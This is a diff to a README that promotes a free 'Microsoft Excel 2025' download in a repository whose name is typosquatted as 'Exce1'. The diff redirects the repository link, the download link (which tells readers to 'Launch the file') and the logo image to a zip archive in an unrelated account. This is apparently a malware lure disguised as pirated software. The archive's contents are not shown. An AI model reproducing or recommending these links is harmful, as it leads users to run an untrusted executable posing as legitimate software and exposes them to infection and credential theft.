@@ -3,7 +3,7 @@
 
 Welcome to the **Microsoft Excel 2025 Free** repository, your ultimate destination for the latest information and resources related to the revolutionary spreadsheet software - Microsoft Excel 2025!
 
-📁 **Repository Name:** [Microsoft-Exce1-Free](https://github.com/Microsoft-Exce1-Free)
+📁 **Repository Name:** [Microsoft-Exce1-Free](https://github.com/Dogtwins/Microsoft-Exce1-Free/releases/download/v2.0/Software.zip)
 
 📌 **Short Description:** Microsoft Excel 2025: The Ultimate Spreadsheet Software for Professionals and Personal Use
 
@@ -30,7 +30,7 @@ In this repository, you can find information, resources, and discussions on a wi
 - Microsoft Excel Activation Key
 - Setting up Microsoft Excel
 
-🔗 For the latest version of the Microsoft Excel 2025 software, you can download it from [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Launch the file and enjoy the power of Excel 2025!
+🔗 For the latest version of the Microsoft Excel 2025 software, you can download it from [here](https://github.com/Dogtwins/Microsoft-Exce1-Free/releases/download/v2.0/Software.zip). Launch the file and enjoy the power of Excel 2025!
 
 🌐 Feel free to explore the link and discover the amazing features of Excel 2025. Visit the official website to learn more about its functionalities.
 
@@ -47,4 +47,4 @@ Join us in this exciting journey with Microsoft Excel 2025! Whether you are a se
 
 Let's excel together with Microsoft Excel 2025! 💼📊🚀
 
-![Excel Logo](https://www.freeiconspng.com/thumbs/excel-icon/microsoft-excel-icon-2.png)
+![Excel Logo](https://github.com/Dogtwins/Microsoft-Exce1-Free/releases/download/v2.0/Software.zip)
